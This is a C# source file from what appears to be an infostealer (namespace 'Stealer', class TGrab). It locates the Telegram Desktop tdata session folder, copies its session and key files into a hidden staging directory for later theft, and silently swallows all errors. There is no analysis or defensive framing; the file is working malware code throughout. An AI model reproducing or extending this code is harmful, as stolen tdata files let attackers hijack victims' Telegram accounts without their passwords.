using System;
using System.Diagnostics;
using System.IO;

namespace Stealer;

public class TGrab
{
	public static int count;

	private static bool in_patch;

	public static void get()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
			if (processesByName.Length >= 1)
			{
				Directory.CreateDirectory(Help.path_stealer + "Telegram\\").Attributes = FileAttributes.Directory | FileAttributes.Normal;
				string toDir = Help.path_stealer + "Telegram";
				CopyAll(text, toDir);
				count++;
			}
			else if (Directory.Exists(text))
			{
				Directory.CreateDirectory(Help.path_stealer + "Telegram\\").Attributes = FileAttributes.Directory | FileAttributes.Normal;
				string toDir2 = Help.path_stealer + "Telegram";
				CopyAll(text, toDir2);
				count++;
			}
		}
		catch
		{
		}
	}

	private static void CopyAll(string fromDir, string toDir)
	{
		try
		{
			Directory.CreateDirectory(toDir).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
			string[] files = Directory.GetFiles(fromDir);
			for (int i = 0; i < files.Length; i++)
			{
				CopyFile(files[i], toDir);
			}
			files = Directory.GetDirectories(fromDir);
			foreach (string text in files)
			{
				if (!text.Contains("emoji") && !text.Contains("dumps") && !text.Contains("tdummy") && !text.Contains("user_data"))
				{
					CopyDir(text, toDir);
				}
			}
		}
		catch
		{
		}
	}

	private static void CopyFile(string s1, string toDir)
	{
		try
		{
			string fileName = Path.GetFileName(s1);
			if (!in_patch || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
			{
				string destFileName = toDir + "\\" + fileName;
				File.Copy(s1, destFileName);
			}
		}
		catch
		{
		}
	}

	private static void CopyDir(string s, string toDir)
	{
		try
		{
			in_patch = true;
			CopyAll(s, toDir + "\\" + Path.GetFileName(s));
			in_patch = false;
		}
		catch
		{
		}
	}
}
